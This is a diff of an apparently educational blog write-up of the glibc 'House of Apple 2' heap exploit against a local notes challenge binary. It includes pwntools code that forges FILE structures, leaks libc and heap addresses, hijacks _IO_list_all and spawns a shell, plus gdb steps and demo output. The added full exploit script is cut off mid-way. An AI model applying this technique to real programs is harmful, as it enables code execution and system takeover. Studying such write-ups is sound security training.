-                won’t realize it’s fake.
-              </p>
-              <p>
-                After that, we
-                <strong>patch critical FILE pointers</strong> like
-                <code>_lock</code>, <code>_wide_data</code>, and the wide vtable
-                pointer. These fields are needed so glibc doesn’t crash and so
-                execution eventually flows into a function pointer we control.
-              </p>
-              <p>
-                Next, we <strong>overwrite <code>_IO_list_all</code></strong> so
-                that instead of pointing to real FILE streams, it points to our
-                fake FILE structure on the heap. Now glibc thinks our fake
-                object is a real file that needs to be flushed.
-              </p>
-              <p>
-                Finally, we <strong>trigger <code>exit()</code></strong
-                >. When the program exits, glibc automatically walks
-                <code>_IO_list_all</code> and flushes every FILE it sees. When
-                it reaches our fake FILE, it follows our controlled pointers and
-                ends up calling <code>system("/bin/sh")</code>.
-              </p>
-              <p>
-                When we call exit ; this is somewhat of a representation of
-                whats happening
+                When exit fires:
               </p>
               <div class="img-container">
                 <img
@@ -1035,48 +446,10 @@ else
                 />
               </div>
               <p>
-                glibc tries to defend against FILE-structure attacks by
-                validating the <strong>main vtable</strong> pointer before using
-                it. That means if you point the main vtable to something fake or
-                attacker-made, glibc will usually detect it and abort. House of
-                Apple 2 avoids this by
-                <strong>not forging a vtable at all</strong>. Instead, it uses a
-                real, legitimate vtable that already exists inside libc, such as
-                <code>_IO_wfile_jumps</code>, which passes all validation checks
-                cleanly.
+                glibc validates the main vtable pointer against a known range. Fake vtable = abort. So we don't fake it - we use <code>_IO_wfile_jumps</code>, a real vtable inside libc, which passes cleanly. The unvalidated part is <code>_wide_vtable</code>, the second vtable for wide-character I/O. glibc never range-checks it. Once execution enters the wide path, it calls through <code>_wide_vtable</code> blind.
               </p>
               <p>
-                The trick is that FILE structures used for wide-character I/O
-                contain a <strong>second vtable</strong>, called the
-                <code>_wide_vtable</code>. Unlike the main vtable, this wide
-                vtable is <strong>not validated</strong> by glibc. Once
-                execution enters a wide-character code path, glibc blindly
-                trusts the function pointers inside <code>_wide_vtable</code>.
-                By overwriting this pointer, the attacker gains control over
-                which function gets called next.
-              </p>
-              <p>
-                First leak a libc address because modern systems use ASLR, which
-                means libc is loaded at a random address every time the program
-                runs. If we do not know where libc is in memory, we cannot
-                reliably call important functions like system. To defeat ASLR,
-                we need to leak one real libc address and use it to calculate
-                the rest.
-              </p>
-              <p>
-                The program lets us read memory using a negative index, which
-                means we can read data before the notes array. In memory, the
-                Global Offset Table (GOT) is located nearby, and it stores the
-                real runtime addresses of libc functions such as free. When we
-                call read_note(-16), we accidentally read the GOT entry for
-                free, leaking its address.
-              </p>
-              <p>
-                Once we have the leaked address of free, we subtract its known
-                offset inside libc. This gives us the base address of libc in
-                memory. From that single value, we can calculate the addresses
-                of all other libc functions, including system, which we will
-                need later in the exploit
+                <code>read_note</code> only checks that the index is less than 11 - never checks for negatives. Index -16 walks backwards from the notes array into the GOT, landing on the <code>free</code> entry. Read that, subtract the known offset of <code>free</code> inside libc, and you have the base address.
               </p>
               <div class="img-container">
                 <img
@@ -1090,140 +463,45 @@ else
               </p>
               <h2>Part A: Fake <code>_IO_FILE</code> structure</h2>
               <pre class="code-block"><code>fake_file = flat({
-    0x00: b"  sh\x00\x00\x00\x00",    # _flags
-    0x88: 0,                         # _lock
-    0xa0: 0,                         # _wide_data
-    0xc0: 1,                         # _mode
+    0x00: b"  sh\x00\x00\x00\x00",
+    0x88: 0,
+    0xa0: 0,
+    0xc0: 1,
     0xd8: libc.sym['_IO_wfile_jumps']
 }, length=224)
 </code></pre>
               <p>
-                This creates a <strong>fake FILE object</strong> exactly the
-                size glibc expects.
+                <code>_flags = "  sh"</code> - glibc passes this field as the first argument when calling through the vtable. We’re replacing the target with <code>system</code>, so that becomes <code>system("  sh")</code>. Leading spaces skip the flag-parsing check. <code>_lock</code> must point at writable memory or glibc crashes trying to lock the FILE - zero for now, patched once we know the heap address. <code>_wide_data</code> will point at the fake <code>_IO_wide_data</code> below. <code>_mode = 1</code> forces glibc into the wide-char path where <code>_wide_vtable</code> is dispatched without validation. <code>vtable = _IO_wfile_jumps</code> is a real libc vtable - passes the range check cleanly.
               </p>
-              <ul>
-                <li>
-                  <strong><code>_flags = " sh"</code></strong>
-                </li>
-              </ul>
-              <p>
-                This field normally stores flags, but later glibc passes it as
-                an argument to a function pointer. Since we hijack that function
-                to be <code>system</code>, this becomes:
-              </p>
-              <pre class="code-block"><code>  system("  sh")
-</code></pre>
-              <p>
-                which spawns a shell. The spaces help avoid validation checks.
-              </p>
-              <ul>
-                <li>
-                  <strong><code>_lock</code></strong>
-                </li>
-              </ul>
-              <p>
-                glibc expects this to point to writable memory. If it’s invalid,
-                the program crashes. We set it to zero for now and patch it
-                later to point into the heap.
-              </p>
-              <ul>
-                <li>
-                  <strong><code>_wide_data</code></strong>
-                </li>
-              </ul>
-              <p>
-                This tells glibc where the wide-character data lives. We will
-                make this point to another fake structure we control.
-              </p>
-              <ul>
-                <li>
-                  <strong><code>_mode = 1</code></strong>
-                </li>
-              </ul>
-              <p>
-                This forces glibc to use
-                <strong>wide-character functions</strong>, which is crucial
-                because those functions use the unvalidated wide vtable.
-              </p>
-              <ul>
-                <li>
-                  <strong><code>vtable = _IO_wfile_jumps</code></strong>
-                </li>
-              </ul>
-              <p>
-                This is a <strong>real vtable inside libc</strong>. Using a
-                legitimate vtable avoids glibc’s vtable integrity checks.
-              </p>
-              <p>
-                At this point, glibc thinks this is a completely valid FILE
-                object.
-              </p>
-              <p>---</p>
+              <hr>
               <h2>Part B: Fake <code>_IO_wide_data</code></h2>
               <pre class="code-block"><code>wide_data = flat({
-    0x18: 0,   # _IO_write_base
-    0x20: 1,   # _IO_write_ptr
-    0xe0: 0    # _wide_vtable
+    0x18: 0,
+    0x20: 1,
+    0xe0: 0
 }, length=0x100)
 </code></pre>
               <p>
-                This structure controls
-                <strong>when glibc decides to flush a file</strong>.
+                <code>_IO_write_ptr = 1</code> and <code>_IO_write_base = 0</code> makes glibc think there's pending data to flush, which triggers the flush path and eventually the wide vtable dispatch. <code>_wide_vtable</code> gets patched once we know the heap address.
               </p>
-              <ul>
-                <li>
-                  <strong><code>_IO_write_ptr > _IO_write_base</code></strong>
-                </li>
-              </ul>
-              <p>
-                Since <code>1 > 0</code>, glibc believes there is pending data
-                that needs to be flushed.
-              </p>
-              <ul>
-                <li>
-                  When glibc flushes, it calls a function from the
-                  <strong>wide vtable</strong>, which we control next.
-                </li>
-              </ul>
-              <ul>
-                <li>
-                  <strong><code>_wide_vtable</code></strong>
-                </li>
-              </ul>
-              <p>This will be patched to point to our fake wide vtable.</p>
-              <p>
-                This is how we force glibc to actually make the function call.
-              </p>
-              <p>---</p>
+              <hr>
               <h2>Part C: Fake wide vtable</h2>
               <pre class="code-block"><code>wide_vtable = flat({
     0x68: libc.sym['system']
 }, length=0x80)
 </code></pre>
-              <ul>
-                <li>
-                  The <code>doallocate</code> function pointer is overwritten
-                  with <code>system</code>.
-                </li>
-                <li>
-                  glibc does <strong>not validate</strong> this wide vtable.
-                </li>
-                <li>
-                  When glibc calls <code>doallocate</code>, it actually calls:
-                </li>
-              </ul>
-              <pre class="code-block"><code>  system(fake_file-&gt;_flags)
-</code></pre>
-              <p>And since <code>_flags = " sh"</code>, we get a shell.</p>
-              <p>---</p>
-              <h2>How everything is laid out in memory</h2>
+              <p>
+                Offset <code>0x68</code> is the <code>doallocate</code> slot. glibc calls it without validation. We put <code>system</code> there - when it fires with the FILE pointer as the first argument, which is  <code>system(fake_file->_flags)</code> = <code>system("  sh")</code>.
+              </p>
+              <hr>
+              <h2>How it's in memory</h2>
               <pre
                 class="code-block"
               ><code>Offset 0x000: fake _IO_FILE      (224 bytes)
 Offset 0x100: fake _IO_wide_data (256 bytes)
 Offset 0x200: fake wide_vtable   (128 bytes)
 </code></pre>
-              <p>And then we write it into the heap:</p>
+              <p>Pack the three structures back-to-back and write them into a single heap allocation so the internal pointers can reference each other at fixed offsets:</p>
               <pre
                 class="code-block"
               ><code>payload = fake_file.ljust(0x100, b'\x00')
@@ -1232,139 +510,47 @@ payload += wide_vtable
 
 create(20000, payload)
 </code></pre>
-              <p>
-                This puts
-                <strong>all fake structures next to each other</strong>, so
-                pointers inside them can reference each other safely.
-              </p>
-              <p>#### Leaking the heap address</p>
+              <h3>Leaking the heap address</h3>
               <pre
                 class="code-block"
               ><code>heap_addr = u64(read_note(0).ljust(8, b'\x00'))
 </code></pre>
               <p>
-                At this point, we already created a note that lives on the heap.
-                When we read that note back, the program does not just give us
-                our clean payload. It also leaks
-                <strong>heap metadata</strong> that glibc stores next to heap
-                chunks. This metadata contains pointers that point back into the
-                heap itself.
+                Reading the note back gives us more than our payload - glibc stores chunk metadata (fd/bk pointers) adjacent to allocations. The first 8 bytes of the note, read as a 64-bit value, land on one of those heap pointers. Subtract the known offset and you have the heap base.
               </p>
-              <p>
-                By reading the first few bytes of the note and converting them
-                into a 64-bit value, we recover a
-                <strong>real heap address</strong>.
-              </p>
-              <p>#### Patching the fake FILE pointers</p>
-              <p>
-                Now that we know the heap base address, we can
-                <strong>fix up the fake FILE structure</strong> so all its
-                internal pointers point to valid memory.
-              </p>
+              <h3>Patching the fake FILE pointers</h3>
+              <p>With the heap address known, we can patch the fake FILE's internal pointers:</p>
               <pre
                 class="code-block"
-              ><code>write_note(0, 0x88, p64(heap_addr + 0x10))   # _lock
+              ><code>write_note(0, 0x88, p64(heap_addr + 0x10))
 </code></pre>
-              <p>
-                The <code>_lock</code> field must point to writable memory or
-                glibc will crash when it tries to lock the FILE. We point it
-                slightly inside the heap, which is always writable.
-              </p>
+              <p><code>_lock</code> must point at writable memory or glibc crashes trying to acquire it.</p>
               <pre
                 class="code-block"
-              ><code>write_note(0, 0xa0, p64(heap_addr + 0x100))  # _wide_data
+              ><code>write_note(0, 0xa0, p64(heap_addr + 0x100))
 </code></pre>
-              <p>
-                This tells glibc where the wide-character data lives. We already
-                placed our fake <code>_IO_wide_data</code> structure at offset
-                <code>0x100</code> inside the payload, so we point
-                <code>_wide_data</code> there.
-              </p>
+              <p>Points at offset <code>0x100</code> in the payload - right where the fake <code>_IO_wide_data</code> sits.</p>
               <pre
                 class="code-block"
-              ><code>write_note(0, 0x1e0, p64(heap_addr + 0x200)) # _wide_vtable
+              ><code>write_note(0, 0x1e0, p64(heap_addr + 0x200))
 </code></pre>
-              <p>
-                Finally, we patch the <code>_wide_vtable</code> pointer to point
-                to our fake wide vtable, which we placed at offset
-                <code>0x200</code>. This is the most important pointer, because
-                glibc does <strong>not validate</strong> it. When glibc later
-                calls a wide-character function, it will jump to whatever
-                function pointer we placed there.
-              </p>
+              <p>This is what glibc calls through which is the unvalidated one </p>
               <div class="img-container">
                 <img
                   src="../images/posts/an-apple-a-day/apple-9.png"
                   alt="Fake FILE Structure"
                 />
               </div>
-              <p>#### Hijacking <code>_IO_list_all</code></p>
+              <h3>Hijacking <code>_IO_list_all</code></h3>
               <p>
-                This is the most important step of the whole exploit. Until now,
-                we’ve only <em>prepared</em> our fake FILE structure. Now we
-                force glibc to actually <strong>use it</strong>.
-              </p>
-              <p>
-                glibc keeps a global pointer called <code>_IO_list_all</code>.
-                This pointer is the
-                <strong>head of a linked list of all FILE structures</strong>
-                that exist in the program. When the program exits, glibc walks
-                this list and flushes every file it finds.
-              </p>
-              <p>
-                Normally, <code>_IO_list_all</code> points to real FILE objects
-                inside libc.
+                 Now we insert our fake FILE into the list glibc actually walks. <code>_IO_list_all</code> is the head of the global FILE chain - glibc follows it on exit to flush every stream. Compute the offset from our heap buffer to <code>_IO_list_all</code>, then use the arbitrary write to overwrite it with the address of our fake FILE. glibc doesn’t validate <code>_IO_list_all</code> contents .(only just flws the pointer)
               </p>
               <pre
                 class="code-block"
-              ><code>io_list_all = libc.sym['_IO_list_all']
+              ><code>io_list_all = libc.sym[‘_IO_list_all’]
 offset = io_list_all - heap_addr
 write_note(0, offset, p64(heap_addr))
 </code></pre>
-              <pre
-                class="code-block"
-              ><code>io_list_all = libc.sym['_IO_list_all']
-</code></pre>
-              <p>
-                Now that we know the libc base address, we can compute the
-                <strong>exact address</strong> of <code>_IO_list_all</code> in
-                memory.
-              </p>
-              <pre class="code-block"><code>offset = io_list_all - heap_addr
-</code></pre>
-              <p>
-                Our arbitrary write primitive is relative to the start of our
-                heap note. So we calculate how far <code>_IO_list_all</code> is
-                <strong>from our heap buffer</strong>.
-              </p>
-              <p>
-                This converts an absolute address into a relative offset we can
-                write to.
-              </p>
-              <pre
-                class="code-block"
-              ><code>write_note(0, offset, p64(heap_addr))
-</code></pre>
-              <p>This is the takeover.</p>
-              <p>
-                We overwrite the value of <code>_IO_list_all</code> so that
-                instead of pointing to real FILE objects, it now points directly
-                to <strong>our fake FILE structure on the heap</strong>.
-              </p>
-              <p>
-                glibc does <strong>not</strong> check whether
-                <code>_IO_list_all</code> points to a real FILE. It blindly
-                trusts the pointer.
-              </p>
-              <p>So after this write:</p>
-              <ul>
-                <li>glibc believes our fake FILE is a real one</li>
-                <li>it adds it to the cleanup process</li>
-              </ul>
-              <p>
-                <em> when <code>exit()</code> is called, glibc will process </em
-                >our* FILE
-              </p>
               <p>
                 <strong>Before</strong>
               </p>
@@ -1386,58 +572,29 @@ elf = ELF('./notes_patched')
 libc = ELF('./libc.so.6')
 p = process('./notes_patched')
 </code></pre>
-              <p>
-                <strong>What this does:</strong>
-                - <code>ELF()</code> loads binary information (addresses,
-                symbols, etc.) - <code>process()</code> starts the target
-                program - <code>pwn</code> library handles communication and
-                address packing
-              </p>
-              <h3>Helper Functions</h3>
+              <h3>Helper functions</h3>
               <pre class="code-block"><code>def create(size, content):
-    p.sendlineafter(b'&gt;&gt; ', b'1')           # Select create option
+    p.sendlineafter(b'&gt;&gt; ', b'1')
     p.sendlineafter(b'SIZE: ', str(size).encode())
-    p.sendlineafter(b'CHARS): ', content)   # Send note content
-</code></pre>
-              <p>
-                This function automates creating a note by: 1. Waiting for the
-                menu prompt <code>>> </code> 2. Sending option
-                <code>1</code> (create) 3. Sending the size 4. Sending the
-                content
-              </p>
-              <pre class="code-block"><code>def read_note(idx):
+    p.sendlineafter(b'CHARS): ', content)
+
+def read_note(idx):
     p.sendlineafter(b'&gt;&gt; ', b'3')
     p.sendlineafter(b'INDEX: ', str(idx).encode())
     p.recvuntil(b'NOTE: ')
-    data = p.recvuntil(b'&lt; BACK', drop=True)
-    return data
-</code></pre>
-              <p>
-                Reads a note and returns its content.
-                <code>drop=True</code> removes the
-                <code>< BACK</code> delimiter.
-              </p>
-              <pre
-                class="code-block"
-              ><code>def write_note(idx, offset, content):
+    return p.recvuntil(b'&lt; BACK', drop=True)
+
+def write_note(idx, offset, content):
     p.sendlineafter(b'&gt;&gt; ', b'4')
     p.sendlineafter(b'INDEX: ', str(idx).encode())
     p.sendlineafter(b'INDEX: ', str(offset).encode())
     p.sendlineafter(b'DATA: ', content)
 </code></pre>
-              <p>Writes to a note at a specific offset (the vulnerability!).</p>
               <h3>Exploitation</h3>
-              <pre class="code-block"><code># Leak libc
-libc_leak = u64(read_note(-16).ljust(8, b'\x00'))
+              <pre class="code-block"><code>libc_leak = u64(read_note(-16).ljust(8, b'\x00'))
 libc.address = libc_leak - libc.sym['free']
 </code></pre>
-              <p>
-                - <code>u64()</code> unpacks 8 bytes to a 64-bit integer -
-                <code>ljust(8, b'\x00')</code> pads data to 8 bytes -
-                Subtracting <code>free</code> offset gives us libc base
-              </p>
-              <pre class="code-block"><code># Build fake FILE
-fake_file = flat({
+              <pre class="code-block"><code>fake_file = flat({
     0x00: b"  sh\x00\x00\x00\x00",
     0x88: 0,
     0xa0: 0,
@@ -1445,93 +602,57 @@ fake_file = flat({
     0xd8: libc.sym['_IO_wfile_jumps']
 }, length=224, filler=b'\x00')
 </code></pre>
-              <p>
-                <code>flat()</code> creates binary data with values at specific
-                offsets, padding with null bytes.
-              </p>
-              <pre class="code-block"><code># Patch pointers
-write_note(0, 0x88, p64(heap_addr + 0x10))
+              <pre class="code-block"><code>write_note(0, 0x88, p64(heap_addr + 0x10))
 </code></pre>
-              <p>
-                - <code>p64()</code> packs a 64-bit integer to 8 bytes
-                (little-endian) - Overwrites the <code>_lock</code> field at
-                offset 0x88
-              </p>
-              <pre class="code-block"><code># Hijack _IO_list_all
-offset = io_list_all - heap_addr
+              <pre class="code-block"><code>offset = io_list_all - heap_addr
 write_note(0, offset, p64(heap_addr))
 </code></pre>
-              <p>
-                Uses the arbitrary relative write to overwrite
-                <code>_IO_list_all</code> in libc!
-              </p>
-              <p>---</p>
-              <h2>Why This Works</h2>
-              <h3>The glibc Call Chain</h3>
+              <hr>
+              <h2>Why this works</h2>
+              <h3>The glibc call chain</h3>
               <p>When you exit, glibc does this:</p>
-              <pre class="code-block"><code>// In elf/dl-fini.c
-exit() {
+              <pre class="code-block"><code>exit() {
     ...
     _IO_cleanup();
 }
 
-// In libio/genops.c
 _IO_cleanup() {
     return _IO_flush_all_lockp(0);
 }
 
-// In libio/genops.c
 _IO_flush_all_lockp() {
     struct _IO_FILE *fp;
 
-    // Iterate the chain!
     for (fp = _IO_list_all; fp != NULL; fp = fp-&gt;_chain) {
-
-        // Check if buffer needs flushing
         if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) {
-
-            // Call overflow from vtable
             if (fp-&gt;_mode &lt;= 0) {
-                // Normal mode
                 _IO_overflow(fp, EOF);
             } else {
-                // Wide mode (our case!)
                 _IO_wfile_overflow(fp, WEOF);
             }
         }
     }
 
 }
-// In libio/wfileops.c
 _IO_wfile_overflow() {
     ...
-    // Check vtable (VALIDATED ✓)
-    _IO_vtable_check(fp-&gt;vtable);  // Passes! We use _IO_wfile_jumps
-
-    // Eventually calls:
+    _IO_vtable_check(fp-&gt;vtable);
     fp-&gt;_wide_data-&gt;_wide_vtable-&gt;doallocate(fp);
-    // ↑ NOT VALIDATED ✗
 }
 </code></pre>
-              <h3>The Bypass</h3>
-              <p>
-                <strong>glibc's protection:</strong>
-              </p>
+              <h3>The bypass</h3>
+              <p>glibc's vtable check:</p>
               <pre
                 class="code-block"
               ><code>void _IO_vtable_check(struct _IO_jump_t *vtable) {
-    // Check if vtable is in valid range
     if (vtable &lt; &amp;__start__IO_vtables ||
         vtable &gt;= &amp;__stop__IO_vtables) {
-        abort();  // Kill the program!
+        abort();
     }
 }
 </code></pre>
               <p>
-                1. We use <code>_IO_wfile_jumps</code> (a real vtable) 2. But
-                <code>_wide_vtable</code> is NOT checked 3. When
-                <code>doallocate</code> is called from
-                <code>_wide_vtable</code>, it executes our function
+                <code>_IO_wfile_jumps</code> lives inside that range, so validation passes. <code>_wide_vtable</code> never goes through this check. When glibc dispatches <code>doallocate</code> from the unvalidated wide vtable, that's our <code>system</code> call.
               </p>
               <div class="img-container">
                 <img
@@ -1539,103 +660,93 @@ _IO_wfile_overflow() {
                   alt="Exploit Diagram"
                 />
               </div>
-              <h2>More on house of apple how it works</h2>
+              <h2>Under the hood: _IO_wstrn_overflow</h2>
               <pre
                 class="code-block"
               ><code>static wint_t _IO_wstrn_overflow (FILE *fp, wint_t c)
 {
     _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;
-
-    // Key Check: if this passes, we write to memory!
     if (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)
     {
-        // VULNERABILITY: Writes heap address to controlled location!
-        // overflow_buf is at fp + 0xf0
-
-        fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;   // [_wide_data+0x18
-]
-        fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;    // [_wide_data+0x10
-]
-        fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;     // [_wide_data+0x00
-]
-        fp-&gt;_wide_data-&gt;_IO_read_end = snf-&gt;overflow_buf + N; // [_wide_data+0x08
-]
+        fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;
+        fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;
+        fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;
+        fp-&gt;_wide_data-&gt;_IO_read_end = snf-&gt;overflow_buf + N;
     }
-
-    // Additional writes
-    fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;  // [_wide_data+0x20]
-    fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;  // [_wide_data+0x28]
+    fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;
+    fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;
 
     return c;
 }
 </code></pre>
               <p>
-                <strong>IMPACT:</strong> By controlling
-                <code>fp->_wide_data</code>, we control WHERE these heap
-                addresses are written!
+                Controlling <code>fp->_wide_data</code> controls where those heap addresses get written - arbitrary write via wide I/O.
               </p>
-              <h3>Demo Program Output</h3>
-              <pre class="code-block"><code>[*] allocate a 0x100 chunk
-===========================old value=======================
-[0x2a410310]: 0x1122334455667788  0x1122334455667788
-[0x2a410320]: 0x1122334455667788  0x1122334455667788
-[0x2a410330]: 0x1122334455667788  0x1122334455667788
-[0x2a410340]: 0x1122334455667788  0x1122334455667788
-===========================old value=======================
+              <h3>Demonstration</h3>
+              <pre class="code-block"><code>$ ./house_of_apple_demo
+chunk @ 0x2a410310
 
-[*] puts address: 0x7fd0ca691cc0
-[*] stderr-&gt;_IO_write_ptr address: 0x7fd0ca82b478
-[*] stderr-&gt;_flags2 address: 0x7fd0ca82b4c4
-[*] stderr-&gt;_wide_data address: 0x7fd0ca82b4f0
-[*] stderr-&gt;vtable address: 0x7fd0ca82b528
-[*] _IO_wstrn_jumps address: 0x7fd0ca826b90
+before
+  [0x2a410310]  0x1122334455667788  0x1122334455667788
+  [0x2a410320]  0x1122334455667788  0x1122334455667788
+  [0x2a410330]  0x1122334455667788  0x1122334455667788
+  [0x2a410340]  0x1122334455667788  0x1122334455667788
 
-[+] step 1: change stderr-&gt;_IO_write_ptr to -1
-[+] step 2: change stderr-&gt;_flags2 to 8
-[+] step 3: replace stderr-&gt;_wide_data with the allocated chunk
-[+] step 4: replace stderr-&gt;vtable with _IO_wstrn_jumps
-[+] step 5: call fcloseall and trigger house of apple
+puts                 = 0x7fd0ca691cc0
+stderr-&gt;_IO_write_ptr = 0x7fd0ca82b478
+stderr-&gt;_flags2       = 0x7fd0ca82b4c4
+stderr-&gt;_wide_data    = 0x7fd0ca82b4f0
+stderr-&gt;vtable        = 0x7fd0ca82b528
+_IO_wstrn_jumps      = 0x7fd0ca826b90
 
-===========================new value=======================
-[0x2a410310]: 0x00007fd0ca82b770  0x00007fd0ca82b870
-[0x2a410320]: 0x00007fd0ca82b770  0x00007fd0ca82b770
-[0x2a410330]: 0x00007fd0ca82b770  0x00007fd0ca82b770
-[0x2a410340]: 0x00007fd0ca82b770  0x00007fd0ca82b870
-===========================new value=======================
+patch stderr-&gt;_IO_write_ptr = -1
+patch stderr-&gt;_flags2       = 8
+patch stderr-&gt;_wide_data    = 0x2a410310
+patch stderr-&gt;vtable        = _IO_wstrn_jumps
+trigger fcloseall()
+
+after
+  [0x2a410310]  0x00007fd0ca82b770  0x00007fd0ca82b870
+  [0x2a410320]  0x00007fd0ca82b770  0x00007fd0ca82b770
+  [0x2a410330]  0x00007fd0ca82b770  0x00007fd0ca82b770
+  [0x2a410340]  0x00007fd0ca82b770  0x00007fd0ca82b870
 </code></pre>
+              <div style="margin: 18px auto 14px; max-width: 760px; text-align: center; font-family: 'Times New Roman', Times, serif; color: #111;">
+                <div style="font-size: 16px; font-style: italic; margin-bottom: 10px;">
+                  Result.
+                </div>
+                <div style="display: inline-grid; grid-template-columns: auto auto auto; column-gap: 16px; row-gap: 8px; align-items: baseline; font-size: 21px; line-height: 1.35; text-align: left;">
+                  <span><em>M</em>[<code>0x2a410310</code>]</span>
+                  <span>=</span>
+                  <span><code>0x1122334455667788</code></span>
+
+                  <span></span>
+                  <span style="text-align:center;">&darr;</span>
+                  <span style="font-size: 17px;">write through <code>_wide_data</code></span>
+
+                  <span><em>M</em>[<code>0x2a410310</code>]</span>
+                  <span>=</span>
+                  <span><code>0x00007fd0ca82b770</code></span>
+                </div>
+                <div style="font-size: 14px; margin-top: 10px;">
+                  The controlled slot is rewritten with <code>stderr-&gt;overflow_buf</code>.
+                </div>
+              </div>
               <p>
-                | Phase | Memory Address | Value | Explanation |
-                |-------|----------------|-------|-------------| |
-                <strong>BEFORE</strong> | <code>0x2a410310</code> |
-                <code>0x1122334455667788</code> | Controlled fill value we set
-                initially | | <strong>AFTER</strong> | <code>0x2a410310</code> |
-                <code>0x00007fd0ca82b770</code> |
-                <code>stderr->overflow_buf</code> address leaked! |
+                overflow_buf ends up written wherever <code>_wide_data</code> points - controlled write of a heap address to arbitrary memory.
               </p>
-              <p>
-                <strong>This demonstrates:</strong> We can write a known address
-                (overflow_buf = heap/libc addr) to ANY memory location we
-                control via <code>_wide_data</code> :)
-              </p>
-              <p>#### Step 1: Set Breakpoint Before fcloseall()</p>
+              <h3>Step 1: set breakpoint before fcloseall()</h3>
               <pre class="code-block"><code>gdb ./house_of_apple
 break fcloseall
 run
 </code></pre>
-              <p>#### Step 2: Examine Hijacked stderr Structure</p>
-              <pre class="code-block"><code># Check stderr location
-p stderr
-# $1 = (struct _IO_FILE *) 0x7ffff7e2b4a0 &lt;_IO_2_1_stderr_&gt;
-
-# Examine critical members
-x/gx (stderr + 0x28)  # _IO_write_ptr (should be -1)
-x/gx (stderr + 0x74)  # _flags2 (should be 8)
-x/gx (stderr + 0xa0)  # _wide_data (should point to our chunk)
-x/gx (stderr + 0xd8)  # vtable (should be _IO_wstrn_jumps)
+              <h3>Step 2: examine hijacked stderr structure</h3>
+              <pre class="code-block"><code>p stderr
+x/gx (stderr + 0x28)
+x/gx (stderr + 0x74)
+x/gx (stderr + 0xa0)
+x/gx (stderr + 0xd8)
 </code></pre>
-              <p>
-                <strong>Expected Output:</strong>
-              </p>
               <pre
                 class="code-block"
               ><code>_IO_write_ptr:  0xffffffffffffffff  (-1)
@@ -1643,15 +754,11 @@ _flags2:        0x0000000000000008  (wide mode enabled)
 _wide_data:     0x0000000000405310  (our controlled chunk!)
 vtable:         0x00007ffff7e26b90  (_IO_wstrn_jumps)
 </code></pre>
-              <p>#### Step 3: Examine Target Chunk BEFORE Attack</p>
+              <h3>Step 3: examine target chunk before attack</h3>
               <pre
                 class="code-block"
-              ><code># Our chunk that _wide_data points to
-x/16gx 0x405310
+              ><code>x/16gx 0x405310
 </code></pre>
-              <p>
-                <strong>Output:</strong>
-              </p>
               <pre
                 class="code-block"
               ><code>0x405310: 0x1122334455667788  0x1122334455667788
@@ -1659,24 +766,19 @@ x/16gx 0x405310
 0x405330: 0x1122334455667788  0x1122334455667788
 0x405340: 0x1122334455667788  0x1122334455667788
 </code></pre>
-              <p>#### Step 4: Continue and Break After _IO_wstrn_overflow</p>
+              <h3>Step 4: continue and break after _IO_wstrn_overflow</h3>
               <pre class="code-block"><code>break _IO_wstrn_overflow
 continue
-
-# Inside _IO_wstrn_overflow, examine:
-print/x $rdi              # fp (our fake _IO_FILE)
-print/x $rdi + 0xf0       # overflow_buf address
-x/gx $rdi + 0xa0          # fp-&gt;_wide_data (our target chunk)
+print/x $rdi
+print/x $rdi + 0xf0
+x/gx $rdi + 0xa0
 </code></pre>
-              <p>#### Step 5: Examine Target Chunk AFTER Attack</p>
+              <h3>Step 5: examine target chunk after attack</h3>
               <pre
                 class="code-block"
-              ><code>finish  # Return from _IO_wstrn_overflow
-x/16gx 0x405310  # Check our chunk again
+              ><code>finish
+x/16gx 0x405310
 </code></pre>
-              <p>
-                <strong>Output:</strong>
-              </p>
               <pre
                 class="code-block"
               ><code>0x405310: 0x00007ffff7e2b770  0x00007ffff7e2b870  ← CHANGED!
@@ -1684,14 +786,81 @@ x/16gx 0x405310  # Check our chunk again
 0x405330: 0x00007ffff7e2b770  0x00007ffff7e2b770  ← CHANGED!
 0x405340: 0x00007ffff7e2b770  0x00007ffff7e2b870  ← CHANGED!
 </code></pre>
-              <h3>SUM FACTZ</h3>
+              <h2>Full Exploit</h2>
+              <p>Putting it all together:</p>
+              <pre class="code-block"><code>from pwn import *
+
+context.binary = elf = ELF('./notes_patched')
+libc = ELF('./libc.so.6')
+io = process(elf.path)
+
+def sl(a, b): io.sendlineafter(a, b)
+def c(sz, data=b''):
+    sl(b'&gt;&gt; ', b'1')
+    sl(b'SIZE: ', str(sz).encode())
+    sl(b'CHARS): ', data)
+
+def r(i):
+    sl(b'&gt;&gt; ', b'3')
+    sl(b'INDEX: ', str(i).encode())
+    io.recvuntil(b'NOTE: ')
+    return io.recvuntil(b'&lt; BACK', drop=True)
+
+def w(i, off, data):
+    sl(b'&gt;&gt; ', b'4')
+    sl(b'INDEX: ', str(i).encode())
+    sl(b'INDEX: ', str(off).encode())
+    sl(b'DATA: ', data)
+
+libc.address = u64(r(-16).ljust(8, b'\x00')) - libc.sym.free
+log.success(f'libc = {libc.address:#x}')
+
+c(0x500, b'A' * 8)
+heap = u64(r(0).ljust(8, b'\x00')) - 0x10
+log.success(f'heap = {heap:#x}')
+
+fake = flat({
+    0x00: b'  sh\x00\x00\x00\x00',
+    0x88: 0,
+    0xa0: 0,
+    0xc0: 1,
+    0xd8: libc.sym._IO_wfile_jumps,
+}, length=0xe0, filler=b'\x00')
+
+wide = flat({
+    0x18: 0,
+    0x20: 1,
+    0xe0: 0,
+}, length=0x100, filler=b'\x00')
+
+vtab = flat({
+    0x68: libc.sym.system,
+}, length=0x80, filler=b'\x00')
+
+payload = fake.ljust(0x100, b'\x00') + wide.ljust(0x100, b'\x00') + vtab
+c(len(payload), payload)
+
+base = heap + 0x560
